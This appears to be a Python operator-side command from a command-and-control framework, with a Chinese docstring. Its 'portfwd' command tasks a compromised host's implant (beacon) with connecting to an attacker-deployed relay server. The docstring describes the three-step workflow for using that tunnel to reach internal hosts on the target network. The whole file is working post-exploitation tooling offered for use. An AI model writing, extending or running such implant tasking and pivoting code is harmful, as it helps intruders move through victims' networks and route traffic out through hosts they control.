"""portfwd — 下发植入物端端口转发(连接独立部署的 protfwd_server)

portfwd <server_ip> <tunnel_port> [beacon_id]
  server_ip:    protfwd_server 部署机地址
  tunnel_port:  protfwd_server 隧道端口(植入物连接)
  beacon_id:    可选,默认当前选中 beacon

配合流程:
  1) s_exec protfwd_server <listen_port> <target_host> <target_port>
     → 生成服务端部署代码, 部署到公网服务器
  2) 本命令把植入物端 portfwd 模块下发执行 → 植入物连上 protfwd_server
  3) 操作机连接 <server_ip>:<listen_port> 即到达目标内网 <target_host>:<target_port>
"""


def run(disp, args):
    if len(args) < 2:
        return "[!] usage: portfwd <server_ip> <tunnel_port> [beacon_id]"
    sip, spt = args[0], args[1]
    bid, _ = disp.resolve_beacon(args[2:])
    if not bid:
        return "[!] 未指定 Beacon"
    try:
        task = disp.build_task_for(bid, "portfwd", [sip, spt])
    except ValueError as e:
        return f"[!] {e}"
    if task is None:
        return "[!] portfwd module not loaded"
    return disp.push_task(bid, task)
